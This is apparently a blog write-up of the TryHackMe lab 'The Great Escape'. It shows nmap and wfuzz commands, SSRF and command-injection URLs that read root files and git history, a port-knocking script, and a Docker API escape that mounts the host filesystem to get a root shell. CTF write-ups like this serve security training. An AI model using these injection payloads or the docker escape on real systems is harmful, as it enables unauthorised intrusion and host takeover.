---
layout: post
author: Razor
title: "Tryhackme The Great Escape"
categories: [Tryhackme, Linux]
tags: [boot2root, medium-box, privilage escalation, web exploitation, enumeration, docker, SSRF]     # TAG names should always be lowercase
image: assets/thm_thegreatescape/bg.png
toc: true
---

## Introduction
This is partical room from tryhackme entitled "The Great Escape" with Medium difficulty. In this room we will learn about SSRF along with code injection, Port Knocking, Enumeration of docker and get escape from docker . Here we will exploit using SSRF then port knocking so that the docker port opens and enters docker then goes to the root of the box. Link for the room [here](https://tryhackme.com/room/thegreatescape)

## Scanning 

### Nmap 

First time we have to do is scanning the Machine :
```bash
$ nmap -sC -sV -oA nmap 10.10.50.223

Nmap scan report for 10.10.50.223
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh?
| fingerprint-strings: 
|   GenericLines: 
|_    *W}$it$!Z5Qg-Xcg.1
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    nginx 1.19.6
| http-robots.txt: 3 disallowed entries 
|_/api/ /exif-util /*.bak.txt$
|_http-server-header: nginx/1.19.6
|_http-title: docker-escape-nuxt
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.91%I=7%D=2/16%Time=602B9D9C%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,14,"\*W}\$it\$!Z5Qg-Xcg\.1\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 16 17:28:41 2021 -- 1 IP address (1 host up) scanned in 207.30 seconds
```

As we can see there is have 2 open ports, Like ssh and webserver. Now let's take a look the webserver : 

![img](/assets/thm_thegreatescape/bg_1.png)

Now i found robots.txt and contain different directory and file : 

![img](/assets/thm_thegreatescape/bg_2.png)

## Enumeration
### Fuzzing

`wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.50.223/FUZZ.bak.txt`
After fuzzing i found this : `http://10.10.3.187/exif-util.bak.txt` and which contains code like this:

```bat
<template>
  <section>
    <div class="container">
      <h1 class="title">Exif Utils</h1>
      <section>
        <form @submit.prevent="submitUrl" name="submitUrl">
          <b-field grouped label="Enter a URL to an image">
            <b-input
              placeholder="http://..."
              expanded
              v-model="url"
            ></b-input>
            <b-button native-type="submit" type="is-dark">
              Submit
            </b-button>
          </b-field>
        </form>
      </section>
      <section v-if="hasResponse">
        <pre>
          {{ response }}
        </pre>
      </section>
    </div>
  </section>
</template>

<script>
export default {
  name: 'Exif Util',
  auth: false,
  data() {
    return {
      hasResponse: false,
      response: '',
      url: '',
    }
  },
  methods: {
    async submitUrl() {
      this.hasResponse = false
      console.log('Submitted URL')
      try {
        const response = await this.$axios.$get('http://api-dev-backup:8080/exif', {
          params: {
            url: this.url,
          },
        })
        this.hasResponse = true
        this.response = response
      } catch (err) {
        console.log(err)
        this.$buefy.notification.open({
          duration: 4000,
          message: 'Something bad happened, please verify that the URL is valid',
          type: 'is-danger',
          position: 'is-top',
          hasIcon: true,
        })
      }
    },
  },
}
</script>

```
Now let's take a look at `exif-util/`, then i try to upload file image and using burpsuite to capture this. 

![img](/assets/thm_thegreatescape/bg_3.png)

From the information provided by burpsuite we can see that the web app made a request to `/api/exif` and the file name also changed

![img](/assets/thm_thegreatescape/bg_4.png)

Then i move to url and capture again with burpsuite, before capture i hosted files using python : `python3 -m http.server 8090`

![img](/assets/thm_thegreatescape/bg_5.png)

Then the request has changed to GET, then i try to put `http://api-dev-backup:8080/exif?url=` to request.

![img](/assets/thm_thegreatescape/bg_6.png)

### SSRF

And as we can see there is curl, Now we can check id with command `echo;id`

![img](/assets/thm_thegreatescape/bg_7.png)

And we get id of app, So we can use SSRF.Now after i looking around i'm found `dev-note.txt` in here `http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;cd%20/;cat%20/root/dev-note.txt`

```
An error occurred: File format could not be determined
                Retrieved Content
                ----------------------------------------
                An error occurred: File format could not be determined
               Retrieved Content
               ----------------------------------------
               Hey guys,

Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.

Anyways, the password is fluffybunnies123

Cheers,

Hydra
```
Then in directory of root i found .git, Now let's check this
`http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20log`

```
Author: Hydra <hydragyrum@example.com>
Date:   Thu Jan 7 16:48:58 2021 +0000

    fixed the dev note

commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Removed the flag and original dev note b/c Security

commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
Author: Hydra <hydragyrum@example.com>
Date:   Wed Jan 6 20:51:39 2021 +0000

    Added the flag and dev notes
```
`http://10.10.50.223/api/exif?url=http://api-dev-backup:8080/exif?url=echo;git%20--git-dir%20/root/.git%20diff%20a3d30a7d0510dc6565ff9316e3fb84434916dee8`

```
diff --git a/dev-note.txt b/dev-note.txt
deleted file mode 100644
index 89dcd01..0000000
--- a/dev-note.txt
+++ /dev/null
@@ -1,9 +0,0 @@
-Hey guys,
-
-I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
-
-Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
-
-Cheers,
-
-Hydra
\ No newline at end of file
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
index aae8129..0000000
--- a/flag.txt
+++ /dev/null
@@ -1,3 +0,0 @@
-You found the root flag, or did you?
-
-THM{0c------------REDACTED--------76}
\ No newline at end of file
```
And we have flag for root flag. As we can see there is knocked ports. then i'm check the port of docker is off.
```
$ nmap -p 2375 10.10.50.223 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:08 WIB
Nmap scan report for 10.10.50.223
Host is up (0.35s latency).

PORT     STATE  SERVICE
2375/tcp closed docker

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```
Now let's knocking that ports then we will be able to access the docker. I'm make little script for knocking :

```bash
#! /bin/bash
curl $1:42 -m 1
sleep 1
curl $1:1337 -m 1
sleep 1
curl $1:10420 -m 1
sleep 1
curl $1:6969 -m 1
sleep 1
curl $1:63000 -m 1
```
Let's run this : `./knock 10.10.50.223`. After run we check again the port of docker 
```
$ nmap -p 2375 10.10.50.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 22:15 WIB
Nmap scan report for 10.10.50.223
Host is up (0.47s latency).

PORT     STATE SERVICE
2375/tcp open  docker

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
```
## Docker

Now port of docker is open, Now lets check this. 
`docker -H 10.10.50.223:2375 info`
```bash
$ docker -H 10.10.50.223:2375 info                                                                     130 ⨯ 1 ⚙
Client:
 Context:    default
 Debug Mode: false
 Plugins:
  app: Docker App (Docker Inc., v0.9.1-beta3)
  buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)

Server:
 Containers: 4
  Running: 4
  Paused: 0
  Stopped: 0
 Images: 27
 Server Version: 20.10.2
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Cgroup Version: 1
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 269548fa27e0089a8b8278fc4fc781d7f65a939b
 runc version: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
 init version: de40ad0
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 4.15.0-130-generic
 Operating System: Ubuntu 18.04.5 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 1
 Total Memory: 983.2MiB
 Name: great-escape.thm
 ID: FDCS:BLAR:AJNY:PW6Y:DVAY:R5IQ:VNLF:WRQ5:FP6Y:2IB5:U37T:3W6L
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

WARNING: API is accessible on http://0.0.0.0:2375 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
WARNING: No swap limit support
```
### Access Docker

Then we can access the docker. First lets check the image of docker :

`$ docker -H 10.10.50.223:2375 images`

![img](/assets/thm_thegreatescape/bg_8.png)

`$ docker -H 10.10.50.223:2375 ps`

![img](/assets/thm_thegreatescape/bg_9.png)

## Escape From Docker

in this case im going to exploit alpine to escape the docker.[here](https://gtfobins.github.io/gtfobins/docker/#shell) the link i found for exploit this.
`docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash`

```bash
$ docker -H 10.10.50.223:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt bash                             1 ⚙
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@0f47e2d39595:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@0f47e2d39595:/# cd /root
root@0f47e2d39595:~# ls
flag.txt
root@0f47e2d39595:~# cat flag.txt 
Congrats, you found the real flag!

THM{c----------REDACTED------------4}
root@0f47e2d39595:~#
``` 
Boom we can escape the docker. Now for looking the flag of web we can access frontend in the docker.
`$ docker -H 10.10.50.223:2375 exec -it dockerescapecompose_frontend_1 /bin/bash`

After looking around i found this in nginx: 
```bash
root@docker-escape:/usr/share/nginx/html/.well-known# cat security.txt 

Hey you found me!

The security.txt file is made to help security researchers and ethical hackers to contact the company about security issues.

See https://securitytxt.org/ for more information.

Ping /api/fl46 with a HEAD request for a nifty treat.
```
so We can curl head of `/api/fl46`.
```bash
$ curl --HEAD http://10.10.50.223/api/fl46

HTTP/1.1 200 OK
Server: nginx/1.19.6
Date: Fri, 19 Feb 2021 15:32:04 GMT
Connection: keep-alive
flag: THM{b8--------REDACTED------------d4}
```
We have flag of web now.

so that's all the writeup that I made now we have 3 flags, including on the web, docker, and the machine from the box

Happy hacking :D